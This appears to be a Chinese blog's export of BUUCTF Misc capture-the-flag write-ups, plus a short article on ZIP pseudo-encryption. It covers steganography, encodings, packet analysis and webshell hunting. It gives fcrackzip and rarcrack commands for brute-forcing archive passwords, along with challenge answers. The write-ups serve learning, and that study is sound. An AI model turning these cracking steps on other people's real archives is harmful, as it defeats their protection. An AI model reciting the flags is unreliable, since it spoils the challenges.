src="/images/wordimage/20220128/pic.jpg"></p><p>如下图是盲文对照表</p><p><img src="/images/wordimage/20220128/englisjhmangwen.png"></p><p>所以对照下来，所对应的字符串应该是<code>kmdonowg</code>，猜测是压缩包密码，解压成功发现是一个音乐，听滴滴答答的声音，应该是摩斯电码。</p><p>如下图，听出来应该是这样。</p><p><img src="/images/wordimage/20220128/music.png"></p><pre class="line-numbers language-none"><code class="language-none">-.-.-..-..--.--....--------..--......--..---..--....---...---..--..<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>如下图是莫斯电码对照表第一个是基本码表，第二个是增加码表。</p><p><img src="/images/wordimage/20220128/mosh1.png"></p><p><img src="/images/wordimage/20220128/mosh2.png"></p><p>字符串是:<code>ctfwpei08732?23dz</code>应该是flag了。</p><p>flag需要去掉ctf字串，flag:<code>flag&#123;wpei08732?23dz&#125;</code></p><hr><h2 id="八-神秘龙卷风"><a href="#八-神秘龙卷风" class="headerlink" title="八.神秘龙卷风"></a>八.神秘龙卷风</h2><p>提示如下</p><blockquote><p>神秘龙卷风转转转，科学家用四位数字为它命名，但是发现解密后居然是一串外星人代码！！好可怕！ 注意：得到的 flag 请包上 flag{} 提交</p></blockquote><p>下载附件发现是rar压缩包被加密了，根据提示，是四位数命名，那么是数字，应该是暴力破解，Kali暴力破解命令如下。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">rarcrack 文件 --threads <span class="token number">10</span> --type <span class="token function">rar</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>我这里使用Windows暴力破解，如下图，口令是<code>5463</code>。</p><p><img src="/images/wordimage/20220128/5463.png"></p><p>打开文本文档发现是一堆的+++和&gt;和少数的.如下图，猜测编码应该是brainfuck编码。</p><p><img src="/images/wordimage/20220128/brainfuck.png"></p><p>在线brainfuck/ook解密网址👉<a href="https://www.splitbrain.org/services/ook">brainfuck解密</a>，解密出来就是flag。</p><p>flag:<code>flag&#123;e4bbef8bdf9743f8bf5b727a9f6332a8&#125;</code></p><hr><h2 id="九-后门查杀"><a href="#九-后门查杀" class="headerlink" title="九.后门查杀"></a>九.后门查杀</h2><p>提示如下</p><blockquote><p>小白的网站被小黑攻击了，并且上传了Webshell，你能帮小白找到这个后门么？(Webshell中的密码(md5)即为答案)。 注意：得到的 flag 请包上 flag{} 提交</p></blockquote><p>md5就是flag</p><p>下载附件，发现是一堆的php源码，这么多找WebShell，直接用杀毒软件扫一下，我这里是使用的是火绒来扫，路径是<code>/include/include.php</code>，如下图就是md5值。</p><p><img src="/images/wordimage/20220128/md5.png"></p><p>flag:<code>flag&#123;6ac45fb83b3bc355c024f5034b947dd3&#125;</code></p><hr><h2 id="十-数据包中的线索"><a href="#十-数据包中的线索" class="headerlink" title="十.数据包中的线索"></a>十.数据包中的线索</h2><p>提示如下</p><blockquote><p>公安机关近期截获到某网络犯罪团伙在线交流的数据包，但无法分析出具体的交流内容，聪明的你能帮公安机关找到线索吗？ 注意：得到的 flag 请包上 flag{} 提交</p></blockquote><p>下载文件发现是数据包文件，先搜索是否有flag字节流，发现没有，然后查看GET提交和POST提交，发现没有POST提交，查看GET提交，命令如下。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">http.request.method<span class="token operator">==</span>GET<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>发现只有两处是GET提交，然后第二个是fenxi.php感觉有点可疑，双击打开分析，发现没有什么东西，然后右键追踪流 &gt; HTTP流，如下图。</p><p><img src="/images/wordimage/20220128/yidadui.png"></p><p>看这样子应该是base64编码，在线解密👉<a href="https://the-x.cn/base64">base64在线解密</a>，解密之后发现是一张jpg图片也是flag，如下图。</p><p><img src="/images/wordimage/20220128/from_the-x.jpg"></p><p>flag:<code>flag&#123;209acebf6324a09671abc31c869de72c&#125;</code></p><hr><h2 id="十一-荷兰宽带数据泄露"><a href="#十一-荷兰宽带数据泄露" class="headerlink" title="十一.荷兰宽带数据泄露"></a>十一.荷兰宽带数据泄露</h2><p>没有提示</p><p>下载附件发现是bin文件，看了一下别人大佬做的，需要用到一个工具叫做<code>RouterPassView</code>没有百度即可下载，安装之后打开直接搜索user，尝试用户名flag或者密码flag，如下图。</p><p><img src="/images/wordimage/20220128/kuandai.png"></p><p>经过尝试，发现username的内容是flag。</p><p>flag:<code>flag&#123;053700357621&#125;</code></p><hr><h2 id="十二-来首歌吧"><a href="#十二-来首歌吧" class="headerlink" title="十二.来首歌吧"></a>十二.来首歌吧</h2><p>没有提示</p><p>下载附件发现是一首歌，这首歌到了1分10秒在左声道会出现莫斯电码，使用Audacity打开，没有百度即可下载，如下图红色箭头就是莫斯电码。</p><p><img src="/images/wordimage/20220128/moshi3.png"></p><p>摩斯电码如下</p><pre class="line-numbers language-none"><code class="language-none">..... -... -.-. ----. ..--- ..... -.... ....- ----. -.-. -... ----- .---- ---.. ---.. ..-. ..... ..--- . -.... .---- --... -.. --... ----- ----. ..--- ----. .---- ----. .---- -.-.<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>最后解码结果<code>5BC925649CB0188F52E617D70929191C</code>。</p><p>flag:<code>flag&#123;5BC925649CB0188F52E617D70929191C&#125;</code></p><p>最后想说的是，歌好好听(～￣▽￣)～</p><hr><h2 id="十三-webshell后门"><a href="#十三-webshell后门" class="headerlink" title="十三.webshell后门"></a>十三.webshell后门</h2><p>提示如下</p><blockquote><p>朋友的网站被黑客上传了webshell后门，他把网站打包备份了，你能帮忙找到黑客的webshell在哪吗？(Webshell中的密码(md5)即为答案)。 注意：得到的 flag 请包上 flag{} 提交</p></blockquote><p>和第九题差不多，参考第九题即可。</p><p>flag:<code>flag&#123;ba8e6c6f35a53933b871480bb9a9545c&#125;</code></p><hr><h2 id="十四-面具下的flag"><a href="#十四-面具下的flag" class="headerlink" title="十四.面具下的flag"></a>十四.面具下的flag</h2><p>没有提示</p><p>下载附件发现是一张你的名字的jpg图片(你的名字超级好康，没康过的建议去康康ヾ(≧▽≦*)o)，如下图。</p><p><img src="/images/wordimage/20220128/mianju.jpg"></p><p>使用Winhex和Stegsolve查看都没啥查看的信息，去Kali查看是否有隐藏的文件,如下命令可以分离文件。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">binwalk -e 文件<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如下图，分离出来一个压缩包和vmdk文件看vmdk文件里面应该是flag了，zip压缩包里面的东西就是vmdk文件，zip压缩包是伪加密，伪加密可以看👉这篇文章，<a href="https://blog.takagisan.top/2022/017a75b1bc.html">伪加密</a>.</p><p><img src="/images/wordimage/20220128/vmdk.png"></p><p>用7z解压vmdk文件，命令如下。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">7z x 文件 -o./<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>解压之后如下图，会多了一个<code>Key_part_one</code>和<code>key_part_two</code>两个文件夹。</p><p><img src="/images/wordimage/20220128/vmdkjieya.png"></p><p>打开第一个<code>key_part_one</code>文件夹如下图，发现是brainfuck编码，解码网址👉，<a href="https://www.splitbrain.org/services/ook">brainfuck在线解密</a>。</p><p><img src="/images/wordimage/20220128/brainfuck1.png"></p><p>解密结果:<code>flag&#123;N7F5_AD5</code>，发现只有一半的flag，另外一半flag极有可能是在<code>key_part_two</code>文件夹里面，里面有两个文本，第一个文本没啥信息，第二个文本信息，如下图，发现是ook编码，也是brainfuck的一种，也可以使用上面的解密网址，👉<a href="https://www.splitbrain.org/services/ook">brainfuck解密</a>。</p><p><img src="/images/wordimage/20220128/ook.png"></p><p>解密结果:<code>_i5_funny!&#125;</code>，所以最终flag如下</p><p>flag:<code>flag&#123;N7F5_AD5_i5_funny!&#125;</code></p><p>说个其他的，直接把<code>flag.vmdk</code>放在Winhex然后<code>ctrl + f</code>搜索flag关键字也可以直接看见文本里面的brainfuck编码，如下图。</p><p><img src="/images/wordimage/20220128/ookflag.png"></p><p>这个图的上面一点就是另外一种brainfuck，如下图。</p><p><img src="/images/wordimage/20220128/brainfuck++.png"></p><hr><h2 id="十五-九连环"><a href="#十五-九连环" class="headerlink" title="十五.九连环"></a>十五.九连环</h2><p>没有提示</p><p>下载下来发现是一个jpg图片，如下。</p><p><img src="/images/wordimage/20220128/123456cry.jpg"></p><p> 使用Stegsolve，没有发现什么信息，使用Winhex搜索字符串flag，发现了信息，如下图。</p><p><img src="/images/wordimage/20220128/flagtxtaa.png"></p><p>直接打开Kali，分离文件命令如下。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">binwalk -e 文件<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如下图分离文件多出来一个asd文件夹，这个文件夹里面有一张jpg图片和一个加密的zip文件，看着这个zip也不是伪加密，那么密码只能从图片里面寻找了，对里面新的图品进行了，Winhex查看，Stegsolve查看，binwalk查看，基本上都没有能利用的信息，这时候一个大佬站出来告诉我，一个工具叫做,<code>steghide</code>，用法介绍👉<a href="https://blog.csdn.net/Blood_Seeker/article/details/81837571">steghide</a>，用法如下图。</p><p><img src="/images/wordimage/20220128/steghide.png"></p><p>命令如下。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">steghide extract -sf 图片文件 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后会在当前目录下面生成一个ko.txt的文件，打开就是zip压缩包的解压密码，里面就是flag。</p><p>flag:<code>flag&#123;1RTo8w@&amp;4nK@z*XL&#125;</code></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> BUUCTF </tag>
            
            <tag> CTF </tag>
            
            <tag> Misc </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>zip压缩包的伪加密</title>
      <link href="/2022/017a75b1bc.html"/>
      <url>/2022/017a75b1bc.html</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>CTF中经常出现</p><hr><h2 id="一-实现伪加密"><a href="#一-实现伪加密" class="headerlink" title="一.实现伪加密"></a>一.实现伪加密</h2><p><code>50 4B 03 04</code>是zip压缩包头文件标记区域，压缩源文件数据区。</p><p><code>50 4B 01 02</code>是目录中文件文件头标记，压缩文件目录区，这个四个字节后的也就是在<code>50 4B 01 02</code>这四个字节后的00修改为09即可实现伪加密，如下图，反之在<code>14 00</code>后面的<code>09</code>改为<code>00</code>伪加密就消失。</p><p><img src="/images/wordimage/20220125-1/weijiamizip.png"></p><p><code>50 4B 05 06</code>是ZIP文件目录结束标志</p><hr><h2 id="二-如何判断是真加密还是伪加密"><a href="#二-如何判断是真加密还是伪加密" class="headerlink" title="二.如何判断是真加密还是伪加密"></a>二.如何判断是真加密还是伪加密</h2><h3 id="1-无加密"><a href="#1-无加密" class="headerlink" title="1.无加密"></a>1.无加密</h3><p>在zip压缩包头文件标记区域也就是在<code>50 4B 03 04</code>两个字节之后应当为<code>00 00</code>,并且目录中文件文件头标记也就是<code>50 4B 01 02</code>四个字节之后 应该为<code>00 00</code>。</p><hr><h3 id="2-伪加密"><a href="#2-伪加密" class="headerlink" title="2.伪加密"></a>2.伪加密</h3><p>在压缩源文件数据区也就是<code>50 4B 03 04</code>两个字节后面应该是<code>00 00</code>,压缩文件目录区<code>50 4B 01 02</code>四个字节后面应该是<code>09 00</code>。</p><p>补充，有些时候伪加密在<code>50 4B 03 04</code>两个字节之后也是<code>09 00</code>，具体看情况，如果<code>09 00</code>的09改为偶数加密会无效，具体看情况</p><hr><h3 id="3-真加密"><a href="#3-真加密" class="headerlink" title="3.真加密"></a>3.真加密</h3><p>在压缩源文件数据区也就是<code>50 4B 03 04</code>两个字节后面应该是<code>09 00</code>，压缩文件目录区也就是<code>50 4B 01 02</code>后面两个字节应该是<code>09 00</code></p><hr><p>参考文章:</p><p><code>[1]:https://blog.csdn.net/qq_26187985/article/details/83654197</code></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> zip压缩包 </tag>
            
            <tag> 伪加密 </tag>
            
            <tag> 碎知识 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BUUCTF-Misc第一页(签到-ningen)</title>
      <link href="/2022/0157b85665.html"/>
      <url>/2022/0157b85665.html</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近又要开始比赛了，所以开始重新刷题，这寒假不是在搞Python就是在搞硬件方面的东西，CTF基本上都快寄了，但是我这种比赛基本上只有主办方才能拿奖，所以无所谓了，刷题嘛，自己学到东西就行。</p><p>BUUCTF:<a href="https://buuoj.cn/challenges">https://buuoj.cn/challenges</a></p><hr><h2 id="一-签到题"><a href="#一-签到题" class="headerlink" title="一.签到题"></a>一.签到题</h2><p>直接输入给的flag即可得分，flag:<code>flag&#123;buu_ctf&#125;</code></p><hr><h2 id="二-金三胖"><a href="#二-金三胖" class="headerlink" title="二.金三胖"></a>二.金三胖</h2><p>发现是一个gif的图片附件，下载下来，如下gif。</p><p><img src="/images/wordimage/20220125-1/aaa.gif" alt="aaa.gif"></p><p>仔细看会发现，里面穿插的是红色flag值，需要做的是把他提取出来，当然可以截图。这里使用ps逐帧分解，可以看见，如下几个图，然后拼接起来即可。</p><p><img src="/images/wordimage/20220125-1/jinsanpang1.png" alt="第一个flag碎片"></p><p><img src="/images/wordimage/20220125-1/jinsanpang2.png" alt="第二个flag碎片"></p><p><img src="/images/wordimage/20220125-1/jinsanpang3.png" alt="第三个flag碎片"></p><p>flag:<code>flag&#123;he11ohongke&#125;</code></p><hr><h2 id="三-二维码"><a href="#三-二维码" class="headerlink" title="三.二维码"></a>三.二维码</h2><p>下载附件，是一张二维码的图，如下图。</p><p><img src="/images/wordimage/20220125-1/QR_code.png"></p><p>当然可以拿出手机来扫码，但是我去过的比赛，没有那个主办方能使用手机，使用工具，<code>QR_Research</code>，没有网上自行百度下载，扫描结果如下。</p><p><img src="/images/wordimage/20220125-1/secret.png"></p><p>flag:<code>flag&#123;secret is here&#125;</code></p><p>然后发现flag是错误的，使用winhex打开查看，如下图。</p><p><img src="/images/wordimage/20220125-1/winhexQRCODE.png"></p><p>本应该png图标在end地方就结束了但是后面发现了<code>50 4B 03 04</code>是zip压缩包的压缩格式，我们系统切换到Kali Linux把图片托进去使用binwalk工具分离压缩包，语法如下。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">binwalk -e 文件名<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>发现确实有一个zip文件，复制到Windows使用<code>Winhex</code>或者<code>010edit</code>查看是否为伪加密，伪加密可以看这个文章，<a href="https://blog.takagisan.top/2022/017a75b1bc.html">zip的伪加密</a>👈，发现压缩文件源文件数据区和压缩文件目录区都是<code>09 00</code>那么肯定是真加密了，如下图红色箭头所指向。</p><p><img src="/images/wordimage/20220125-1/relpassword.png"></p><hr><h3 id="1-Windows暴力破解"><a href="#1-Windows暴力破解" class="headerlink" title="1.Windows暴力破解"></a>1.Windows暴力破解</h3><p>如下图，使用了zip破解工具暴力破解出密码是<code>7639</code>，其他工具应该也差不多。</p><p><img src="/images/wordimage/20220125-1/zippojie.png"></p><p>最后使用密码打开即可,flag:<code>flag&#123;vjpw_wnoei&#125;</code></p><hr><h3 id="2-Linux暴力破解"><a href="#2-Linux暴力破解" class="headerlink" title="2.Linux暴力破解"></a>2.Linux暴力破解</h3><p>使用Kali自带的fcrackzip进行弱口令爆破，使用命令如下。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">fcrackzip -b -c1 -u -l4 文件名<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-text" data-language="text"><code class="language-text">解释上面参数-b#暴力破解-c1#使用纯数字-u  #使用unzip清除错误密码<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>如下图</p><p><img src="/images/wordimage/20220125-1/linuxzippojie.png"></p><p>密码和上面windows显示一致:<code>7639</code></p><p>最后使用密码打开即可,flag:<code>flag&#123;vjpw_wnoei&#125;</code></p><hr><h2 id="四-你竟然赶我走"><a href="#四-你竟然赶我走" class="headerlink" title="四.你竟然赶我走"></a>四.你竟然赶我走</h2><p>下载附件，发现是一张jpg图片，如下图。</p><p><img src="/images/wordimage/20220125-1/biubiu.jpg"></p><p>看见图片我第一时间想着的就是先用<code>Winhex</code>看看再说，结果flag就在图片底下，如下图。</p><p><img src="/images/wordimage/20220125-1/biubiuflag.png"></p><p>flag:<code>flag&#123;stego_is_s0_bor1ing&#125;</code></p><hr><h2 id="五-N种方法解决"><a href="#五-N种方法解决" class="headerlink" title="五.N种方法解决"></a>五.N种方法解决</h2><p>下载附件下来，发现是一个exe文件，想了一下，还是拉进Winhex文件里面查看一下，发现头是<code>data:image/jpg</code>后面跟着一大串，如下图，这种时候就可以复制到浏览器查看了。</p><p><img src="/images/wordimage/20220125-1/KEYexe.png"></p><p>未完待续……….</p><p>从data的地方开始复制到最后，然后访问，发现是一个二维码，这里说个小插曲，我用QR_Research扫描扫不出来，最后还是拿出手机扫出来的，扫出来的内容是:<code>KEY&#123;dca57f966e4e4e31fd5b15417da63269&#125;</code>按照提示要求修改flag即可。</p><p>flag:<code>flag&#123;dca57f966e4e4e31fd5b15417da63269&#125;</code></p><hr><h2 id="六-大白"><a href="#六-大白" class="headerlink" title="六.大白"></a>六.大白</h2><p>题目现在有提示。</p><blockquote><p>看不到图？ 是不是屏幕太小了 注意：得到的 flag 请包上 flag{} 提交</p></blockquote><p>提示已经很明确了，应该是修改图片的高度和宽度。</p><p>下载附件是一个png图片，我们右键属性查看宽度和高度，如下图，发现是<code>679 x 256</code>的分辨率。</p><p><img src="/images/wordimage/20220125-1/dabaishuxing.png"></p><p>我们使用Winhex或者其他软件打开，如下图，其中第二行红色箭头所指的<code>00 00 02 A7</code>里面的<code>02A7</code>为宽度，<code>00 00 01 00</code>里面的<code>0100</code>为高度，02A7转换成十进制就是，679，我们把0100也修改成02A7即可看见flag。</p><p><img src="/images/wordimage/20220125-1/dabaixiugai.png"></p><p>修改过后的图片👇</p><p><img src="/images/wordimage/20220125-1/dabaiflag.png"></p><p>flag:<code>flag&#123;He1l0_d4_ba1&#125;</code></p><hr><h2 id="七-基础破解"><a href="#七-基础破解" class="headerlink" title="七.基础破解"></a>七.基础破解</h2><p>提示如下</p><blockquote><p>给你一个压缩包，你并不能获得什么，因为他是四位数字加密的哈哈哈哈哈哈哈。。。不对= =我说了什么了不得的东西。。 注意：得到的 flag 请包上 flag{} 提交</p></blockquote><p>看样子应该是暴力破解</p><hr><h3 id="1-Windows暴力破解工具"><a href="#1-Windows暴力破解工具" class="headerlink" title="1.Windows暴力破解工具"></a>1.Windows暴力破解工具</h3><p>这里我使用的是ARCHPR，破解工具，如下图，破解成功，密码是<code>2563</code>。</p><p><img src="/images/wordimage/20220125-1/jichupojie.png"></p><p>打开<code>flag.txt</code>发现里面是一堆字符串，看见<code>Zmxh</code>就是<code>BASE64</code>编码，如下图BASE64解密结果。</p><p><img src="/images/wordimage/20220125-1/base64jiemijichupojie.png"></p><p>flag:<code>flag&#123;70354300a5100ba78068805661b93a5c&#125;</code></p><hr><h3 id="2-Kali暴力破解"><a href="#2-Kali暴力破解" class="headerlink" title="2.Kali暴力破解"></a>2.Kali暴力破解</h3><p>需要做一个前置工作，如果Kali里面没有安装rarcrack需要安装，命令如下。</p><p><em><strong>安装rarcrack</strong></em></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">apt</span> <span class="token function">install</span> rarcrack <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>安装完毕之后，工具使用命令如下。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">rarcrack 文件名 --threads 线程数 --type <span class="token function">rar</span><span class="token operator">|</span><span class="token function">zip</span><span class="token operator">|</span>7z<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>我这里放一张正在破解的图了，如下图👇，因为破解的实在是太慢了，我就算是用100线程也还是慢，Windows用工具一会就跑出来了，总之Kali跑出来之后和Windows操作一样解密即可。</p><p><img src="/images/wordimage/20220125-1/kalipojierar.png"></p><hr><h2 id="八-乌镇峰会种图"><a href="#八-乌镇峰会种图" class="headerlink" title="八.乌镇峰会种图"></a>八.乌镇峰会种图</h2><p>提示如下</p><blockquote><p>乌镇互联网大会召开了，各国巨头汇聚一堂，他们的照片里隐藏着什么信息呢？（答案格式：flag｛答案｝，只需提交答案） 注意：得到的 flag 请包上 flag{} 提交</p></blockquote><p>下载附件发现是一张jpg图片。</p><p><img src="/images/wordimage/20220125-1/b56cde4f-be03-4d07-a0ca-6af22284f0aa.jpg"></p><p>先用Winhex打开看最前面和最后面，如下图，在最后面看见了flag。</p><p><img src="/images/wordimage/20220125-1/wuzhenfeng.png"></p><p>flag:<code>flag&#123;97314e7864a8f62627b26f3f998c37f1&#125;</code></p><hr><h2 id="九-文件中的秘密"><a href="#九-文件中的秘密" class="headerlink" title="九.文件中的秘密"></a>九.文件中的秘密</h2><p>提示如下</p><blockquote><p>小明经常喜欢在文件中藏一些秘密。时间久了便忘记了，你能帮小明找到该文件中的秘密吗？ 注意：得到的 flag 请包上 flag{} 提交</p></blockquote><p>下载附件发现是一张路飞的jpeg图片</p><p><img src="/images/wordimage/20220125-1/luffpass.jpeg"></p><p>使用Winhex打开看看，看最下面，啥东西都没有，但是在中间有一堆的空数据，仔细看看空数据，在中间发现了flag。</p><p><img src="/images/wordimage/20220125-1/luffwinhex.png"></p><p>flag:<code>flag&#123;870c5a72806115cb5439345d8b014396&#125;</code></p><hr><h2 id="十-LSB"><a href="#十-LSB" class="headerlink" title="十.LSB"></a>十.LSB</h2><p>这题没提示，但是题目其实就是提示<code>LSB</code>，百度百科说的是<code>最低有效位</code>，解释如下。</p><pre class="line-numbers language-none"><code class="language-none">最低有效位（ least significant bit，LSB）指的是一个二进制数字中的第0位（即最低位）。最低有效位和最高有效位是相对应的概念。<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>下载题目附件，发现是一张png图片，如下</p><p><img src="/images/wordimage/20220126/flag11.png"></p><p>处理LSB的软件是<code>Stegsolve</code>，经过分析发现在<code>Red plane 0</code>，<code>Green plane 0</code>，<code>Blue plane 0</code>的地方顶部存在一个黑色条条，这样看是在这三个地方隐藏了信息，如下图。</p><p><img src="/images/wordimage/20220126/flag11red.png"></p><p><img src="/images/wordimage/20220126/flag11green.png"></p><p><img src="/images/wordimage/20220126/flag11blue.png"></p><p>在软件顶部，选择<code>Analyse</code> &gt; <code>Data Extract</code>，右边选择LSB First，然后左边在Red，Blue，Green的地方选择0，然后点击Preview，在顶部发现了PNG图片头应该是隐藏了一张PNG图片，如下图。</p><p><img src="/images/wordimage/20220126/flag11png.png"></p><p>我们点击Save Bin，保存为png图片，发现是一张二维码图片，如下图，使用QR扫一下即可出现flag。</p><p><img src="/images/wordimage/20220126/aflag.png"></p><p>flag:cumtctf{1sb_i4_s0_Ea4y}，修改过后,<code>flag&#123;1sb_i4_s0_Ea4y&#125;</code></p><hr><h2 id="十一-wireshark"><a href="#十一-wireshark" class="headerlink" title="十一.wireshark"></a>十一.wireshark</h2><p>提示如下</p><blockquote><p>黑客通过wireshark抓到管理员登陆网站的一段流量包（管理员的密码即是答案) 注意：得到的 flag 请包上 flag{} 提交</p></blockquote><p>看来是分析流量包，下载附件流量包用Wirshark打开。</p><p>思路是这样的，既然提示是登录网站的一段流量包，提交的时候肯定是POST方法提交的，我们只需要找出POST方法提交的流量包即可，在上面应用过滤器输入代码如下。</p><pre class="line-numbers language-none"><code class="language-none">http.request.method&#x3D;&#x3D;POST<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>发现只有这一个是POST方法提交，如下图，双击点进去之后发现，一个password，应该是就是flag了。</p><p><img src="/images/wordimage/20220126/wirsharkflag.png"></p><p>flag:<code>flag&#123;ffb7567a1d4f4abdffdb54e022f8facd&#125;</code></p><hr><h2 id="十二-rar"><a href="#十二-rar" class="headerlink" title="十二.rar"></a>十二.rar</h2><p>提示如下</p><blockquote><p>这个是一个rar文件，里面好像隐藏着什么秘密，但是压缩包被加密了，毫无保留的告诉你，rar的密码是4位纯数字。 注意：得到的 flag 请包上 flag{} 提交</p></blockquote><p>看样子应该又是暴力破解了，这里还是会写Windows的破解过程和Kali的破解过程。</p><hr><h3 id="1-Windows暴力破解-1"><a href="#1-Windows暴力破解-1" class="headerlink" title="1.Windows暴力破解"></a>1.Windows暴力破解</h3><p>用的软件是ARCHPR，没有可以百度下载，如下图破解成功，密码是8795。</p><p><img src="/images/wordimage/20220126/windowspojie.png"></p><p>打开压缩包里面的txt文件即可获得flag。</p><p>flag:<code>flag&#123;1773c5da790bd3caff38e3decd180eb7&#125;</code></p><hr><h3 id="2-Kali暴力破解-1"><a href="#2-Kali暴力破解-1" class="headerlink" title="2.Kali暴力破解"></a>2.Kali暴力破解</h3><p>破解过程和第七题的基础破解一样，可以参考第七题的Kali暴力破解</p><hr><h2 id="十三-zip伪加密"><a href="#十三-zip伪加密" class="headerlink" title="十三.zip伪加密"></a>十三.zip伪加密</h2><p>下载附件发现是一个zip压缩包，题目就是提示，伪加密可以看这篇文章，👉<a href="https://blog.takagisan.top/2022/017a75b1bc.html">zip伪加密</a>，如下图操作，红色箭头把09修改为00即可，或者其他偶数。</p><p><img src="/images/wordimage/20220126/weijiami.png"></p><p>flag:<code>flag&#123;Adm1N-B2G-kU-SZIP&#125;</code></p><hr><h2 id="十四-qr"><a href="#十四-qr" class="headerlink" title="十四.qr"></a>十四.qr</h2><p>提示如下</p><blockquote><p>这是一个二维码，谁用谁知道！ 注意：得到的 flag 请包上 flag{} 提交</p></blockquote><p>下载附件发现是一张png二维码图片，如下图，思路当然就是扫一下。</p><p><img src="/images/wordimage/20220126/1abe854d-4770-4214-829b-bf6ff513fa14.png"></p><p>结果扫一下还真出来了，如下图。</p><p><img src="/images/wordimage/20220126/qrflag.png"></p><p>flag:<code>Flag&#123;878865ce73370a4ce607d21ca01b5e59&#125;</code>修改一下<code>flag&#123;878865ce73370a4ce607d21ca01b5e59&#125;</code></p><hr><h2 id="十五-被嗅探的流量"><a href="#十五-被嗅探的流量" class="headerlink" title="十五.被嗅探的流量"></a>十五.被嗅探的流量</h2><p>提示如下</p><blockquote><p>某黑客潜入到某公司内网通过嗅探抓取了一段文件传输的数据，该数据也被该公司截获，你能帮该公司分析他抓取的到底是什么文件的数据吗？ 注意：得到的 flag 请包上 flag{} 提交</p></blockquote><p>下载附件是一个流量包，提示说的是文件传输的数据，这里有两种解法，但是也不算是。</p><p>首先和十一题的Wireshark一样，看看POST传输，输入如下代码。</p><pre class="line-numbers language-none"><code class="language-none">http.request.method&#x3D;&#x3D;POST<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>发现有两个POST提交的数据包，发现其中一个是jpg图片，如下图</p><p><img src="/images/wordimage/20220126/wirshark.png"></p><p>然后右键，追踪流 &gt; HTTP流，发现上传的图片叫做flag.jpg，我们拉到最后看看这个图片是啥，发现是flag！如下图。</p><p><img src="/images/wordimage/20220126/wirsharkflag1.png"></p><p>flag:<code>flag&#123;da73d88936010da1eeeb36e945ec4b97&#125;</code></p><p>这里说下其他方法，也可以直接打开流量包之后ctrl + f搜索，选择分组字节流，然后选择宽窄，flag就直接出来了,如下图。</p><p><img src="/images/wordimage/20220126/wirsharkflag2.png"></p><p>还有一种就是把图片导入出来，去Winhex里面去查看，在上面输入<code>http.request.method==POST</code>之后出现的第二个POST包，找到如下图箭头所指向。</p><p><img src="/images/wordimage/20220126/wisharkflag3.png"></p><p>之后右键箭头所指<code>导出分组字节流</code>，选择全部文件保存为jpg格式图片，然后在放进Winhex查看最下面就是flag。</p><hr><h2 id="十六-镜子里面的世界"><a href="#十六-镜子里面的世界" class="headerlink" title="十六.镜子里面的世界"></a>十六.镜子里面的世界</h2><p>没有提示</p><p>下载附件，发现是一张PNG图片，如下图。</p><p><img src="/images/wordimage/20220126/steg.png"></p><p>首先查看图片二进制，发现没啥可发现的，然后用Stegsolve查看，发现也没啥可以发现的，然后查看各个通道的0通道的值，就发现了flag，如下图。</p><p><img src="/images/wordimage/20220126/steg1.png"></p><p>flag:<code>flag&#123;st3g0_saurus_wr3cks&#125;</code></p><hr><h2 id="十七-ningen"><a href="#十七-ningen" class="headerlink" title="十七.ningen"></a>十七.ningen</h2><p>提示如下</p><blockquote><p>人类的科学日益发展，对自然的研究依然无法满足，传闻日本科学家秋明重组了基因序列，造出了名为ningen的超自然生物。某天特工小明偶然截获了日本与俄罗斯的秘密通信，文件就是一张ningen的特写，小明通过社工，知道了秋明特别讨厌中国的六位银行密码，喜欢四位数。你能找出黑暗科学家秋明的秘密么？ 注意：得到的 flag 请包上 flag{} 提交</p></blockquote><p>提示是四位数，但是下载附件是一张jpg图片，如下图。</p><p><img src="/images/wordimage/20220126/jp.jpg"></p><p>用Winhex查看没啥东西，然后用Stegsolve查看，各个通道也查看了，也没啥东西，去Kali里面分离一下文件，是不是有东西在里面用的是<code>binwalk</code>工具，命令如下。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">binwalk -e 文件<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>发现确实有东西，如下图，是一个zip文件，需要密码，根据提示是四位数密码，参考第七题基础破解破解密码即可，里面就是flag，Kali我建议使用fcrackzip。</p><p><img 